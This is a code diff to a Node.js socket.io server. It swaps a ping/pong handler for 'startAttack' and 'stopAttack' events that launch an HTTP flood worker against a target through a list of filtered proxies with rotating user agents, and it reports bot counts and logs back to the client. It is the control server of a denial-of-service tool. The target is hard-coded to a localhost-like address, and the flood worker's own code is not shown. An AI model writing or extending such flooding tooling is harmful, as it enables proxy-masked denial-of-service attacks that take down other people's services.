@@ -1,6 +1,11 @@
 import express from "express";
 import {createServer} from "http";
 import {Server} from "socket.io";
+import {Worker} from "worker_threads";
+import {join} from "path";
+import {AttackMethod, AttackWorker} from "./types";
+import {filterProxies} from "./utils/proxy";
+import {loadProxies, loadUserAgents} from "./utils/file";
 
 const PORT = process.env.PORT || 3000;
 const __prod = process.env.NODE_ENV === "production";
@@ -18,11 +23,67 @@ const io = new Server(httpServer, {
 io.on("connection", (socket) => {
     console.log("Client connected");
 
-    socket.on('ping', () => {
-        console.log('PING')
-        socket.emit('pong');
-        console.log('PONG')
-    })
+    socket.on("startAttack", (params) => {
+        // const {target, duration, packetDelay, attackMethod, packetSize} = params;
+        const target = 'http://127.0.0.0.1:8000';
+        const filteredProxies = filterProxies(loadProxies(), AttackMethod.HTTPFlood);
+        const userAgents = loadUserAgents();
+        const duration = 1000;
+        const packetDelay = 100;
+        const packetSize = 64;
+
+        socket.emit("stats", {
+            log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
+            bots: filteredProxies.length,
+        });
+
+        const worker = new Worker(join(__dirname, AttackWorker.HTTPFlood), {
+            workerData: {
+                target,
+                proxies: filteredProxies,
+                userAgents,
+                duration,
+                packetDelay,
+                packetSize,
+            },
+        });
+
+        worker.on("message", (message) => socket.emit("stats", message));
+
+        worker.on("error", (error) => {
+            console.log(error);
+
+            console.error(`Worker error: ${error.message}`);
+            socket.emit("stats", {log: `❌ Worker error: ${error.message}`});
+        });
+
+        worker.on("exit", (code) => {
+            console.log(`Worker exited with code ${code}`);
+            socket.emit("attackEnd");
+        });
+
+
+        // @ts-ignore
+        socket["worker"] = worker;
+    });
+
+    socket.on("stopAttack", () => {
+        // @ts-ignore
+        const worker = socket["worker"];
+        if (worker) {
+            worker.terminate();
+            socket.emit("attackEnd");
+        }
+    });
+
+    socket.on("disconnect", () => {
+        // @ts-ignore
+        const worker = socket["worker"];
+        if (worker) {
+            worker.terminate();
+        }
+        console.log("Client disconnected");
+    });
 })
 
 httpServer.listen(PORT, () => {
